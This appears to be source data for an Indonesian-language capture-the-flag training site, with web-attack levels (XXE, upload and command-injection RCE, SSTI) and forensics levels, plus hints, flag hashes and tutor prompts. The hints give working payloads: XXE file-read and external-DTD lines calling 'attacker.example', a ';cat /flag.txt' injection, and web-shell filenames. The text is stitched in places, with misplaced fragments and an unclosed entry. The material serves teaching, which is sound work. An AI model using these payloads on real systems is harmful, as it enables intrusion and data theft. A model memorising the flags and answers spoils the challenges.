      "Gunakan hostname internal yang baru kamu temukan buat pivot ke service kedua.",
      "Coba: <code>http://internal-billing.local:8080/admin</code>",
      "2257ac8b5526eb6cb9316080b52118e7399b4f0a19a7bf0c43bd16e4c192133e",
      "Topik: SSRF internal pivot ke service kedua setelah recon awal. Jelaskan konsep chaining SSRF tanpa kasih hostname final."),
  ],
},

{
  id:"xxe", tier:2, icon:"📄", title:"XML External Entity",
  materi:`<p>XXE terjadi saat parser XML aplikasi masih memproses <b>DOCTYPE</b> dan <b>external entity</b> — fitur XML lawas yang bisa dipakai buat baca file lokal, request jaringan (mirip SSRF), atau bikin parser crash (DoS).</p>
  <p><b>General entity vs parameter entity:</b> general entity (<code>&amp;xxe;</code>) dipakai di BODY dokumen. Parameter entity (<code>%xxe;</code>) cuma bisa dipakai DI DALAM DTD itu sendiri — penting kalau titik vulnerable-nya ada di definisi DTD, bukan di body.</p>
  <p><b>Blind XXE:</b> kalau response nggak nampilin hasil entity secara langsung, attacker butuh teknik out-of-band (OOB) — DTD eksternal di server attacker buat exfiltrate data lewat request keluar, atau memancing PARSER ERROR yang nge-leak isi file di pesan errornya.</p>
  <p><b>Pencegahan:</b> disable DTD processing & external entity resolution di parser XML (hampir semua library modern punya opsi ini), jangan pernah percaya XML dari input user tanpa hardening ini.</p>`,
  levels:[
    lvl(1,"File Read Basic",
      `Fitur "Import Profil" parse XML tanpa disable external entity.`,
      "Definisikan ENTITY yang merujuk ke skema file://, lalu referensikan di body.",
      "Pola: <code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM \"file:///app/secret.txt\"&gt;]&gt;</code> lalu pakai <code>&amp;xxe;</code>",
      "5487fb15d8167d220e72b0ddc9ba9da1fb9d707acc0d249bf5d226dee89ad699",
      "Topik: XXE basic file read via general entity. Jelaskan struktur DOCTYPE+ENTITY tanpa kasih payload lengkap."),
    lvl(2,"Parameter Entity",
      `Parser ini ngeblok general entity yang langsung dipakai di body, TAPI nggak ngeblok parameter entity di dalam DTD.`,
      "Parameter entity ditandai dengan tanda persen (%), bukan &, dan cuma valid di dalam definisi DTD.",
      "Pola: <code>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM \"file:///app/secret.txt\"&gt; %xxe;]&gt;</code>",
      "38e436ee687a8fb621af395bc7b5daa39005b4305bdd0285eb2d5f5db48f3bbe",
      "Topik: XXE parameter entity untuk bypass blok general entity. Jelaskan bedanya % vs & tanpa kasih payload lengkap."),
    lvl(3,"Out-of-Band Exfiltration — Konsep",
      `Response server nggak pernah nampilin isi entity (blind). Kamu perlu DTD eksternal di server kamu sendiri buat exfiltrate data secara out-of-band.`,
      "Definisikan parameter entity yang nunjuk ke DTD eksternal di server attacker, DTD itu yang berisi logic buat baca file lalu kirim keluar.",
      "Pola: <code>&lt;!ENTITY % remote SYSTEM \"http://attacker.example/evil.dtd\"&gt; %remote;</code>",
      "eaf4a58dd6484ca87b3842ac445a59978323c6011930f463cdb545d1842f0ea7",
      "Topik: XXE OOB exfiltration via external DTD untuk blind XXE. Jelaskan kenapa perlu OOB tanpa kasih payload lengkap."),
    lvl(4,"Error-based Exfiltration",
      `Server nggak nampilin isi file, tapi kalau parsing GAGAL, pesan error-nya nampilin sepotong konteks yang gagal di-parse.`,
      "Gabungkan entity file:// dengan entity kedua yang sengaja dibuat 'invalid' sehingga error message-nya nyeret isi entity pertama.",
      "Konsep: paksa parser gagal PAS lagi expand entity yang isinya file target, sehingga isi file nempel di pesan error.",
      "e868a09e5e3289084ccaab841c46d1dc7e4236ccb9b21456a9ca11524fc4ab76",
      "Topik: XXE error-based exfiltration lewat pesan error parser. Jelaskan konsepnya tanpa kasih payload lengkap."),
    lvl(5,"Blind XXE — Full Chain",
      `Gabungkan SEMUA teknik: parameter entity + DTD eksternal, dua tahap sekaligus dalam satu payload penuh.`,
      "Payload lengkap butuh dua ENTITY: satu buat baca file, satu lagi buat kirim isinya keluar lewat DTD eksternal.",
      "Gabungkan pola Level 2 (parameter entity) dan Level 3 (external DTD) jadi satu payload utuh.",
      "6771edaada0d9fc569e8d0ca6859b59ff74792a05ed3fa45b1ad040775ab0b2a",
      "Topik: capstone XXE — full blind XXE chain gabungan parameter entity + OOB. Jelaskan alurnya tanpa kasih payload lengkap."),
  ],
},

{
  id:"rce", tier:3, icon:"💀", title:"Remote Code Execution",
  materi:`<p>RCE adalah tujuan akhir paling parah dari banyak vulnerability class — attacker bisa jalanin kode/command APAPUN di server target. Beberapa jalur umum menuju RCE:</p>
  <ul>
  <li><b>Unrestricted file upload</b> — filter ekstensi yang bolong (blacklist tidak lengkap, cek ekstensi terakhir doang, atau cuma cek Content-Type header) bikin attacker bisa upload web shell.</li>
  <li><b>Command injection</b> — input user dimasukin ke shell command tanpa sanitasi karakter meta shell (<code>; | &amp;&amp; $() \`\`</code>).</li>
  <li><b>Insecure deserialization</b> — object serialized dari sumber untrusted di-deserialize tanpa validasi, memicu "magic method" (constructor/destructor otomatis) yang bisa dirangkai jadi gadget chain menuju eksekusi kode.</li>
  </ul>
  <p><b>Pencegahan:</b> validasi ekstensi DAN isi file (bukan cuma nama/Content-Type), jangan pernah concat input user ke shell command (pakai API command yang parameterized), hindari deserialize data dari sumber untrusted, kalau terpaksa pakai format aman (JSON) bukan native object serialization.</p>`,
  levels:[
    lvl(1,"Upload Filter — Ekstensi Bolong",
      `Filter upload avatar cuma blokir persis <code>.php</code>.`,
      "Ekstensi apa lagi yang di banyak konfigurasi server tetap dieksekusi sebagai PHP?",
      "Coba nama file: <code>shell.phtml</code>",
      "eee0fd6a43c50cc3ed91ff8c26d73b1b62418aa9c97be93696f91669eb7ceb14",
      "Topik: RCE via upload filter bolong (extension blacklist tidak lengkap). Jelaskan tanpa kasih nama ekstensi final."),
    lvl(2,"Double Extension",
      `Filter cek ekstensi TERAKHIR doang harus gambar. Tapi server (misconfig Apache) tetap eksekusi PHP kalau ADA <code>.php</code> di nama file, di posisi manapun.`,
      "Kombinasikan ekstensi PHP di tengah nama file dengan ekstensi gambar di akhir.",
      "Coba: <code>shell.php.jpg</code>",
      "9f526c283d8dcea0cf1cfaea8911d55b5b9570a02935f875794cdc5c51d29cd7",
      "Topik: RCE via double extension bypass. Jelaskan kenapa ini bisa terjadi di Apache misconfig, tanpa kasih nama file final."),
    lvl(3,"Content-Type Bypass",
      `Filter cek header <code>Content-Type</code> upload harus <code>image/*</code>, tapi nggak pernah cek nama file/isinya.`,
      "Nama file boleh berekstensi PHP, asal Content-Type yang kamu kirim disamarkan jadi gambar.",
      "Filename: <code>shell.phtml</code>, Content-Type: <code>image/jpeg</code>",
      "8fd3a53de045223cc0c6197b5fe078378cdaa202d3ee309d4da7d633356ca2f5",
      "Topik: RCE via Content-Type header spoofing. Jelaskan kenapa cek Content-Type doang nggak cukup, tanpa kasih detail final."),
    lvl(4,"Command Injection",
      `Fitur "Ping Tool" jalanin <code>ping -c 1 &lt;input&gt;</code> di server tanpa sanitasi karakter shell.`,
      "Karakter shell meta seperti titik koma atau operator AND bisa dipakai buat 'nambahin' command baru setelah command asli selesai.",
      "Coba: <code>127.0.0.1; cat /flag.txt</code>",
      "c10d8a9e3ede2e50169b3141d1b48ca866c405b853975bed29c5811c76977055",
      "Topik: RCE via OS command injection lewat fitur ping tool. Jelaskan karakter shell metacharacter tanpa kasih payload lengkap."),
    lvl(5,"Insecure Deserialization Chain",
      `Aplikasi deserialize object dari cookie session TANPA validasi. Ada class <code>Logger</code> yang, kalau di-deserialize, otomatis nulis isi field <code>file</code> ke path yang kamu tentuin — termasuk ke direktori <code>cron</code>.`,
      "Kamu perlu craft serialized object dengan class Logger, field file yang ngarah ke direktori cron server, biar kode kamu otomatis dieksekusi terjadwal.",
      "Struktur: object serialized dengan nama class <code>Logger</code>, dan field <code>file</code> yang isinya path menuju direktori <code>cron</code>.",
      "add384aa03e1c5546cb33dcddbf9e9e5575b627623f6575ba9c18acd8928791d",
      "Topik: capstone RCE via insecure deserialization + gadget chain (class Logger ke cron). Jelaskan konsep magic method tanpa kasih payload lengkap."),
  ],
},

{
  id:"ssti", tier:3, icon:"🧩", title:"Server-Side Template Injection",
  materi:`<p>SSTI terjadi saat input user dimasukin LANGSUNG ke dalam template string sebelum di-render oleh template engine (mirip Jinja2, Twig, Freemarker), bukan cuma jadi VALUE dari sebuah variabel. Akibatnya, input kamu dievaluasi sebagai EKSPRESI template, bukan teks statis.</p>
  <p><b>Cara deteksi:</b> masukin ekspresi matematis seperti <code>{{7*7}}</code> — kalau hasilnya <b>49</b> (bukan literal teks), berarti template engine beneran mengevaluasi input kamu.</p>
  <p><b>Eskalasi:</b> dari situ, attacker biasanya coba akses variabel internal (<code>{{user.role}}</code>, <code>{{config}}</code>), lalu kalau ada filter kata kunci, cari cara bypass (string concatenation, bracket notation), sampai akhirnya eskalasi ke RCE lewat object traversal ke fungsi built-in Python/Java di balik template engine.</p>
  <p><b>Pencegahan:</b> jangan PERNAH render input user langsung sebagai template — perlakukan sebagai VALUE/variabel biasa, pakai sandboxed template engine kalau rendering dinamis memang dibutuhkan.</p>`,
  levels:[
    lvl(1,"Math Probe",
      `Fitur "Preview Sapaan" render template mirip Jinja2. Input kamu masuk langsung ke template string.`,
      "Coba masukin {{7*7}} — kalau hasilnya 49 (bukan teks '7*7'), input kamu dievaluasi sebagai ekspresi.",
      "Coba: <code>{{7*7}}</code>, kalau hasilnya 49 lanjut coba akses <code>{{user.role}}</code>",
      "5b4a5076b75b72a91dcf068659481c70c16271d88de71aaf949c33212c03b7e9",
      "Topik: SSTI deteksi awal via math probe {{7*7}}. Jelaskan tujuannya tanpa kasih payload eskalasi."),
    lvl(2,"Variable Leak",
      `Template engine expose object <code>user</code> yang punya field <code>role</code>.`,
      "Coba akses field spesifik dari object user yang expose ke template.",
      "Coba: <code>{{user.role}}</code>",
      "10df64b0cbf6315707f1a34ce7406b1f58c2c793d98a5793686e9dcc55ce1235",
      "Topik: SSTI variable leak, akses object internal via dot notation. Jelaskan tanpa kasih nama field final."),
    lvl(3,"Config Object Access",
      `Template engine expose object <code>config</code> yang nyimpen secret aplikasi, termasuk field <code>SECRET_FLAG</code>.`,
      "Coba akses object config secara langsung.",
      "Coba: <code>{{config.SECRET_FLAG}}</code>",
      "01eb1a291a755433af67fdc93f5365e92da69f19c8f83e30796198b34d848066",
      "Topik: SSTI config object access, akses object internal sensitif. Jelaskan tanpa kasih payload lengkap."),
    lvl(4,"Filter Bypass — Blacklist Keyword",

/* Flatten WEB_TOPICS into pseudo-challenge objects so scoring/tier-gating/
   rendering can treat them uniformly alongside forensics & crypto. */
function webTopicChallenges(){
  const out = [];
  for (const t of WEB_TOPICS){
    for (const L of t.levels){
      out.push({
        id: t.id+"-"+L.n, cat:"web", tier:t.tier, topic:t.title,
        title: t.title+" — Level "+L.n+": "+L.title,
        points: L.points, scenario: L.scenario, hints: L.hints,
        flagHash: L.flagHash, aiPrimer: L.aiPrimer,
        webTopicId: t.id, levelNum: L.n, artifact: null, interactive: null,
      });
    }
  }
  return out;
}

  materi:`<p>Log Analysis adalah proses membaca catatan aktivitas sistem/aplikasi (access log, auth log, error log) buat nemuin pola anomali yang nunjukin serangan atau penyalahgunaan. Bedanya sama Timeline Analysis: Log Analysis fokus ke SATU sumber log dan pola di dalamnya, Timeline Analysis mengkorelasi BANYAK sumber sekaligus.</p>

{
  id:"disk", tier:2, icon:"💾", title:"Disk Forensics",
  materi:`<p>Disk Forensics adalah analisis media penyimpanan (hard disk, SSD, flash drive) buat nemuin bukti — termasuk file yang "udah dihapus". Kunci pentingnya: menghapus file biasanya cuma menghapus REFERENSI-nya di filesystem (nama file, lokasi), bukan data fisiknya — data itu masih ada di disk sampai ke-overwrite blok baru.</p>
  <p><b>Konsep & artefak penting:</b></p>
  <ul>
  <li><b>File carving</b> — merekonstruksi file dari data mentah disk berdasarkan pola/signature-nya, tanpa butuh metadata filesystem.</li>
  <li><b>Recycle Bin artifact</b> — Windows nyimpen metadata file yang dihapus (nama asli, lokasi asli, waktu hapus) di file <code>$I</code> terpisah dari file aslinya (<code>$R</code>).</li>
  <li><b>Alternate Data Stream (ADS)</b> — fitur NTFS yang bisa nyimpen data TERSEMBUNYI "nempel" di file lain (<code>filename:streamname</code>), nggak kelihatan di Explorer biasa.</li>
  <li><b>Slack space</b> — sisa ruang kosong di cluster terakhir suatu file (karena ukuran file jarang persis kelipatan ukuran cluster), sering masih nyimpen sisa data file LAMA yang pernah menempati cluster itu.</li>
  <li><b>Partition table</b> — bisa aja ada partisi yang disembunyikan/nggak di-mount default.</li>
  </ul>
  <p><b>Tools nyata:</b> <code>Autopsy</code>, <code>The Sleuth Kit</code>, <code>foremost</code>/<code>scalpel</code> (file carving), <code>testdisk</code>.</p>`,
  levels:[
    flvl(1,"File Dihapus, Fisiknya Masih Ada",
      `File dihapus dari disk tapi datanya belum ke-overwrite. Ini hasil raw sector dump dari proses carving.`,
      `<div class="term">0x1A00: F1L3_R3C0V3RY garbage-noise fragment-data
0x1A10: continued... <span class="hl">RUY{disk_l1_carved_deleted_file}</span> ...trailing-noise
0x1A20: 00 00 00 padding end-of-recovered-block</div>`,
      "Data yang 'dihapus' fisiknya masih ada sampai ke-overwrite — itu dasar file carving.",
      "Scan teks recovered sector baris demi baris, cari pola RUY{...}.",
      "6b6be1e54ec9c83f923c7f402e5a108d3940906a8d04d58a23926753e8bcd5ec",

    flvl(2,"Recycle Bin Artifact",
      `Windows Recycle Bin nyimpen metadata file terhapus di file <code>$I</code> terpisah — nama asli, path asli, dan waktu hapus tetap tercatat walau file-nya udah "dikosongin" dari bin.`,
      `<div class="term">$I file: $IK3F9A2.jpg
Original path: <span class="hl">C:\\Users\\budi\\Documents\\secret_RUY{disk_l2_recycle_bin_artifact}.txt</span>
Deleted timestamp: 2025-02-01 03:14:00</div>`,
      "File $I nyimpen path ASLI dari file yang dihapus, bukan nama random di Recycle Bin.",
      "Baca field 'Original path' baik-baik — nama file aslinya ada flag di situ.",
      "0aaca6ee9cae603ce85a414dbca3be09a318a7de1c02f49731b402b27a1c7be7",
      "Topik: Recycle Bin artifact ($I file) menyimpan metadata file terhapus. Jelaskan struktur $I vs $R tanpa sebut isi flag."),
    flvl(3,"NTFS Alternate Data Stream",
      `File <code>report.docx</code> kelihatan normal di Explorer, tapi punya ADS (Alternate Data Stream) tersembunyi nempel di file yang sama.`,
      `<div class="term">Stream: report.docx  (ukuran normal, 45 KB)
Stream: <span class="hl">report.docx:hidden.txt</span>  (ukuran 38 bytes)
  content: RUY{disk_l3_ntfs_ads_stream}</div>`,
      "ADS ditulis dengan format <code>namafile:namastream</code> — nggak kelihatan lewat Explorer biasa, cuma kebaca lewat tool khusus atau command line (<code>dir /r</code>).",
      "Baca isi stream tersembunyi itu langsung — udah plaintext.",
      "1d58b0dbf75f8d65c32fa0712b2329d23ec0059e3bdb45e3f1e4102a81da0bcb",
      "Topik: NTFS Alternate Data Stream buat menyembunyikan data. Jelaskan kenapa ADS nggak kelihatan di Explorer tanpa sebut isi flag."),
    flvl(4,"Data di Slack Space",
      `File <code>memo.txt</code> ukurannya cuma 200 bytes, tapi dialokasikan 1 cluster penuh (4096 bytes). Sisa 3896 bytes ('slack space') masih nyimpen sisa data file LAMA yang pernah nempatin cluster itu.`,
      `<div class="term">memo.txt logical size: 200 bytes
Cluster allocated: 4096 bytes
Slack space (byte 200-4096): ...old-deleted-file-remnant... <span class="hl">RUY{disk_l4_slack_space_data}</span> ...more-remnant...</div>`,
      "Ukuran LOGIS file beda dari ukuran cluster yang dialokasikan filesystem — selisihnya itu slack space.",
      "Slack space nyimpen sisa byte dari file lama yang menempati cluster itu SEBELUM file saat ini ditulis di situ.",
      "fdbec37a0eb769859a14d8e3f5e8c8da5d96430019a3783bf307317a0619f603",
      "Topik: disk forensics slack space, sisa data file lama di cluster. Jelaskan kenapa slack space kebentuk tanpa sebut isi flag."),
    flvl(5,"Partisi Tersembunyi",
      `Partition table (MBR) disk ini punya 4 entry. Salah satunya bertipe nggak umum dan nggak pernah di-mount otomatis oleh OS — kemungkinan disengaja disembunyikan.`,
      `<div class="term">Partition 1: type=0x07 (NTFS) — C:
Partition 2: type=0x07 (NTFS) — D:
Partition 3: type=0x00 (unused)
<span class="hl">Partition 4: type=0x27 (Hidden NTFS) — label="BACKUP_RUY{disk_l5_partition_table_hidden}"</span></div>`,
      "Tipe partisi <code>0x27</code> adalah 'Hidden NTFS Partition' — sengaja disembunyikan dari daftar drive normal Windows.",
      "Baca field label partisi tersembunyi itu.",
      "0310f010f354b66d6b423294c378fc72245c8f38d666a524fe2eb0ce4999b650",
      "Topik: partition table dengan entry hidden partition. Jelaskan tipe partisi hidden (0x27) tanpa sebut isi flag."),
  ],
},

{
  id:"net", tier:2, icon:"📡", title:"Network Forensics",
  materi:`<p>Network Forensics adalah analisis traffic jaringan (packet capture / pcap) buat rekonstruksi apa yang sebenarnya terjadi — siapa komunikasi ke siapa, data apa yang dikirim, dan apakah ada pola mencurigakan seperti exfiltration atau command-and-control (C2).</p>
  <p><b>Yang biasa dicari:</b></p>
  <ul>
  <li><b>Cleartext credential</b> — traffic HTTP (bukan HTTPS) yang ngirim username/password polos, kebaca siapa aja yang sniffing.</li>
  <li><b>DNS exfiltration</b> — data dicuri dengan cara di-encode jadi subdomain DNS query (<code>data-chunk.attacker.com</code>), teknik ini sering lolos firewall karena DNS biasanya diizinin keluar bebas.</li>
  <li><b>Beacon traffic</b> — request periodik dengan interval tetap ke domain yang sama, ciri khas malware C2 yang "check-in" berkala.</li>
  <li><b>TLS SNI leak</b> — meskipun traffic terenkripsi (HTTPS), field SNI (Server Name Indication) di awal handshake TLS masih plaintext dan nunjukin hostname tujuan.</li>
  <li><b>ARP spoofing</b> — MAC address untuk IP gateway yang berubah tiba-tiba di tengah sesi, indikasi man-in-the-middle attack.</li>
  </ul>
  <p><b>Tools nyata:</b> <code>Wireshark</code>, <code>tcpdump</code>, <code>Zeek/Bro</code> buat analisis skala besar.</p>`,
  levels:[
    flvl(1,"Kredensial Plaintext",
      `Traffic HTTP (bukan HTTPS) nunjukin form login yang ngirim data plaintext, kebaca siapa aja yang capture traffic-nya.`,
      `<div class="term">POST /login HTTP/1.1
Host: legacy-app.rustycorp.internal
Content-Type: application/x-www-form-urlencoded

<span class="hl">username=svc_backup&password=RUY{net_l1_plaintext_credential}</span></div>`,
      "Ini HTTP biasa (bukan HTTPS) — semua data di body request kebaca plaintext oleh siapapun yang sniffing traffic.",
      "Field password di body request itu langsung berisi flag-nya.",
      "add63e03b3dfcf9b9593ba1a5cb011c2817962199194a76b312f18956fa12b7d",
      "Topik: network forensics kredensial cleartext di traffic HTTP. Jelaskan risiko HTTP tanpa enkripsi tanpa sebut isi flag."),
    flvl(2,"DNS Exfiltration",
      `Attacker mencuri data dengan encode jadi beberapa DNS query subdomain berturut-turut (data dipecah jadi chunk hex).`,
      `<div class="term">DNS query: 5255597b6e65745f.attacker-c2.example
DNS query: 6c325f646e735f65.attacker-c2.example
DNS query: 7866696c74726174696f6e7d.attacker-c2.example
<span class="dim">// gabungkan ketiga subdomain (hex) berurutan, lalu decode hex ke ASCII</span></div>`,
      "Tiap subdomain itu potongan hex — gabungkan berurutan dulu sebelum decode.",
      "Setelah digabung: <code>5255597b6e65745f6c325f646e735f657866696c74726174696f6e7d</code> — decode hex ke ASCII.",
      "2866bddf70efffff9d8efe17f12957baffaaace2ebf09364314245a84ece92fe",
      "Topik: network forensics DNS exfiltration, data dipecah jadi subdomain hex berurutan. Jelaskan teknik DNS tunneling tanpa sebut isi flag."),
    flvl(3,"Beacon Interval",
      `Firewall log nunjukin request periodik tiap 60 detik ke domain yang sama, dengan payload custom di header yang di-hex-encode.`,
      `<div class="term">10:00:00 POST c2-relay.example/beacon X-Beacon-Data: 5255597b6e65745f
10:01:00 POST c2-relay.example/beacon X-Beacon-Data: 6c335f626561636f
10:02:00 POST c2-relay.example/beacon X-Beacon-Data: 6e5f696e74657276616c7d</div>`,
      "Payload di header X-Beacon-Data itu hex, bisa langsung di-decode balik ke ASCII.",
      "Gabungkan 3 fragment hex-nya berurutan: <code>5255597b6e65745f6c335f626561636f6e5f696e74657276616c7d</code>",
      "1306539b70e57b15b6b48197f0279555f066f594a4216704ea110a06805df947",
      "Topik: network forensics beacon traffic periodik (ciri khas C2). Jelaskan pola beacon interval tanpa sebut isi flag."),
    flvl(4,"TLS SNI Leak",
      `Traffic ini HTTPS (terenkripsi), tapi field SNI di awal handshake TLS masih plaintext dan kebaca analyst.`,
      `<div class="term">TLS ClientHello — SNI: internal-billing-exfil-drop.attacker.example
[Note analis: domain ini nggak pernah muncul di whitelist internal.
Investigasi lanjut: RUY{net_l4_tls_sni_leak}]</div>`,
      "Field SNI (Server Name Indication) di TLS handshake nggak dienkripsi, meskipun isi traffic setelahnya terenkripsi.",
      "Baca catatan analis setelah SNI field-nya.",
      "632265c802b0e7231cfe1edd380301f94f76cd9e443d8eadcf590a84884609fe",
      "Topik: network forensics TLS SNI leak, hostname tujuan tetap plaintext walau HTTPS. Jelaskan kenapa SNI bisa dibaca tanpa sebut isi flag."),
    flvl(5,"Bukti ARP Spoofing",
      `MAC address untuk gateway (192.168.1.1) berubah TIBA-TIBA di tengah sesi — indikasi ada attacker yang nge-spoof ARP buat jadi man-in-the-middle.`,
      `<div class="term">09:00:00 ARP: 192.168.1.1 is-at AA:BB:CC:00:11:22 (gateway asli)
09:14:32 ARP: 192.168.1.1 is-at DE:AD:BE:EF:13:37 (BERUBAH! MITM terdeteksi)
[Evidence tag: RUY{net_l5_arp_spoof_evidence}]</div>`,
      "MAC address gateway harusnya STATIS. Perubahan tiba-tiba di tengah sesi adalah red flag ARP spoofing.",
      "Baca evidence tag setelah anomali MAC address terdeteksi.",
      "3de7e2905ea768dd7b95d2273362f61b4edacda70d6b5f4d99192347dc344ea8",
      "Topik: network forensics ARP spoofing, perubahan MAC address gateway mendadak. Jelaskan kenapa ini indikasi MITM tanpa sebut isi flag."),
  ],
},

{
  id:"time", tier:2, icon:"⏱️", title:"Timeline Analysis",
  materi:`<p>Timeline Analysis mengkorelasi timestamp dari BANYAK sumber log berbeda (auth log, file access log, network log, dst) buat merekonstruksi URUTAN kejadian yang sebenarnya. Satu log sendirian sering nggak cukup — insiden baru "kelihatan" ceritanya pas beberapa sumber digabung berdasarkan waktu.</p>
  <p><b>Tantangan umum:</b></p>
  <ul>
  <li>Event yang urutannya nggak masuk akal (akses file terjadi SEBELUM izin akses diberikan) nunjukin ada yang salah.</li>
  <li><b>Clock skew</b> — jam di sistem berbeda-beda bisa nggak sinkron; analyst harus koreksi offset dulu sebelum korelasi timestamp valid.</li>
  <li>Korelasi lintas host — insiden nyata sering ninggalin jejak di banyak sistem (workstation → server → firewall), harus digabung berdasarkan IP/session ID/username yang sama.</li>
  <li><b>Kill chain</b> — rekonstruksi lengkap dari initial access sampai exfiltration adalah tujuan akhir timeline analysis pada insiden serius.</li>
  </ul>
  <p><b>Tools nyata:</b> <code>log2timeline/plaso</code>, atau spreadsheet manual buat insiden kecil — intinya selalu normalisasi timezone dulu sebelum urutkan.</p>`,
  levels:[
    flvl(1,"Login di Luar Jam Kerja",
      `Akun kontraktor login di jam yang nggak wajar buat aktivitas kerja normal.`,
      `<div class="term">auth.log: 02:14:03 login success user=contractor_devi src=10.0.4.22
[Investigasi: kenapa login jam 2 pagi? RUY{time_l1_login_after_hours}]</div>`,
      "Jam kerja normal biasanya 08:00-18:00. Login jam 02:14 itu anomali yang layak diinvestigasi.",
      "Baca catatan investigasi setelah entry login-nya.",
      "665f7cce3e1d4a601871c61ee5d009f09f700c39c171b4ee835bbdb5ca9f2ccc",
      "Topik: timeline analysis login di luar jam kerja normal. Jelaskan kenapa waktu anomali penting tanpa sebut isi flag."),
    flvl(2,"Urutan Akses File yang Aneh",
      `File diakses SEBELUM izin akses resmi diberikan — urutan waktu yang harusnya nggak mungkin kalau prosedur normal diikuti.`,
      `<div class="term">14:02:10 file-access.log: user=devi READ /finance/payroll.xlsx
14:05:33 access-grant.log: admin GRANT devi access to /finance/payroll.xlsx
[Anomali urutan: akses terjadi SEBELUM grant! RUY{time_l2_file_access_order}]</div>`,
      "Bandingin timestamp akses file dengan timestamp pemberian izin akses — urutannya harusnya izin DULU baru akses.",
      "Di sini urutannya kebalik — itu tandanya ada masalah (akses ilegal sebelum resmi disetujui, atau grant di-backdate).",
      "b45daeef4225ac0237b5c6c3b808545ae611a5bb181cf0e73f133719185ea607",
      "Topik: timeline analysis urutan event yang tidak logis (akses sebelum izin). Jelaskan pentingnya urutan waktu tanpa sebut isi flag."),
    flvl(3,"Clock Skew Terdeteksi",
      `Dua sistem punya jam yang nggak sinkron. Setelah dikoreksi offset-nya, urutan event yang tadinya kelihatan normal jadi mencurigakan.`,
      `<div class="term">System A (firewall) clock: 10:00:00 — event: outbound connection blocked
System B (webserver) clock: 09:55:00 — event: suspicious file upload
[Setelah cek NTP: System A ternyata 5 menit LEBIH CEPAT dari waktu sebenarnya.
Setelah dikoreksi, upload terjadi SEBELUM block — RUY{time_l3_clock_skew_detected}]</div>`,
      "Jangan langsung percaya timestamp mentah dari tiap sistem — cek dulu apakah jamnya udah sinkron (biasanya via NTP).",
      "Setelah dikoreksi offset 5 menit, urutan kejadian yang sebenarnya jadi beda dari yang kelihatan awalnya.",
      "d435167f166dbb3dc1fa37729d6e01add6fe3cdf1cbda76353e58140a4b15bdb",
      "Topik: timeline analysis clock skew antar sistem yang harus dikoreksi sebelum korelasi. Jelaskan kenapa ini penting tanpa sebut isi flag."),
    flvl(4,"Korelasi Multi-Host",
      `Tiga host berbeda (workstation, jump server, database server) perlu dikorelasi berdasarkan IP yang sama buat ngerti pergerakan attacker (lateral movement).`,
      `<div class="term">Workstation-07 (10.0.2.15): 09:00 login as devi
Jump-Server (10.0.2.15 → 10.0.3.5): 09:04 SSH connection from devi
DB-Server (10.0.3.5): 09:07 query executed by service_account (BUKAN devi!)
[Lateral movement terdeteksi: RUY{time_l4_multi_host_correlation}]</div>`,
      "IP yang sama (10.0.2.15) muncul di dua host berbeda — itu benang merah buat korelasi.",
      "Perhatikan siapa yang query di DB-Server — bukan user yang sama dengan yang login di awal, itu tandanya credential udah di-pivot.",
      "2ea110f7b6e88677390ed06d82a898eaf4b949ea1e1bf0f64300a7a87fed5d5e",
      "Topik: timeline analysis korelasi multi-host untuk deteksi lateral movement. Jelaskan cara menghubungkan log lintas sistem tanpa sebut isi flag."),
    flvl(5,"Full Kill Chain",
      `Rekonstruksi lengkap dari initial access sampai exfiltration data, gabungan dari 4 sumber log berbeda.`,
      `<div class="term">1. INITIAL ACCESS  08:00 — phishing email opened, macro executed
2. EXECUTION       08:03 — powershell.exe spawned from winword.exe
3. PERSISTENCE     08:10 — scheduled task created: "SystemUpdateCheck"
4. EXFILTRATION    08:45 — 250MB uploaded to external-storage.example
[Kill chain lengkap direkonstruksi: RUY{time_l5_full_kill_chain}]</div>`,
      "Susun keempat tahap ini berdasarkan urutan waktu — ini pola kill chain klasik: initial access → execution → persistence → exfiltration.",
      "Baca tag di akhir setelah keempat tahap kill chain-nya lengkap.",
      "b572934e8d466ab7c9f5b64aea06d81d1a3bfa4251ffa01f560b9849ba00f473",
      "Topik: capstone timeline analysis — full kill chain dari initial access sampai exfiltration. Jelaskan tahapan kill chain tanpa sebut isi flag."),
  ],
},

{
  id:"mem", tier:3, icon:"🧠", title:"Memory Forensics",
  materi:`<p>Memory Forensics menganalisis isi RAM (memory dump) dari sistem yang lagi/pernah jalan. Ini penting banget karena banyak malware modern didesain "fileless" — nggak pernah nulis file ke disk, cuma jalan di memory, jadi Disk Forensics aja nggak bakal nemuin apa-apa.</p>
  <p><b>Yang bisa ditemuin di memory:</b></p>
  <ul>
  <li>Command-line lengkap dari proses yang udah selesai/masih jalan (termasuk argumen yang sengaja di-obfuscate/encode).</li>
  <li><b>Process injection</b> — proses legit yang punya kode/module asing "disuntikkan" ke dalamnya oleh malware, biar nyamar.</li>
  <li>Isi clipboard yang sempat di-copy user (termasuk password yang di-paste dari password manager).</li>
  <li>Kredensial plaintext yang sempat "mampir" di memory proses seperti LSASS (target favorit tool credential dumping).</li>
  <li><b>Hidden process (rootkit)</b> — proses yang aktif di memory tapi disembunyikan dari process list yang kelihatan normal (Task Manager dsb).</li>
  </ul>
  <p><b>Tools nyata:</b> <code>Volatility</code> (framework paling umum), <code>strings</code> buat quick-look isi mentah dump.</p>`,
  levels:[
    flvl(1,"Artefak di Cmdline Proses",
      `Hasil <code>strings</code> dari memory dump nunjukin command-line proses mencurigakan dengan komentar base64 nempel.`,
      `<div class="term">libc.so.6
[heap fragment noise...]
<span class="hl">cmdline: /usr/bin/python3 -c "import os" # note=UlVZe21lbV9sMV9jbWRsaW5lX2FydGlmYWN0fQ==</span>
[more heap noise...]</div>`,
      "Scroll strings-nya, cari baris cmdline dari proses mencurigakan.",
      "Ada string Base64 nempel di komentar cmdline-nya. Decode dulu.",
      "b2f3b9a94694518d3ad643da2fa4411b72c2cb4dda26e0b8c3bac5a90b497894",
      "Topik: memory forensics artefak di cmdline proses (base64 tersembunyi). Jelaskan cara menyisir strings output tanpa decode langsung."),
    flvl(2,"Proses Ter-inject",
      `Proses <code>svchost.exe</code> (biasanya proses sistem legit) punya module yang di-load dari path yang nggak wajar — indikasi process injection.`,
      `<div class="term">Process: svchost.exe (PID 4102)
Parent: services.exe (normal)
Loaded modules: kernel32.dll, ntdll.dll,
<span class="hl">C:\\Users\\Public\\temp_RUY{mem_l2_injected_process}.dll (UNSIGNED, loaded from non-standard path!)</span></div>`,
      "svchost.exe normalnya cuma load module dari System32 — module dari folder Users\\Public itu sangat mencurigakan.",
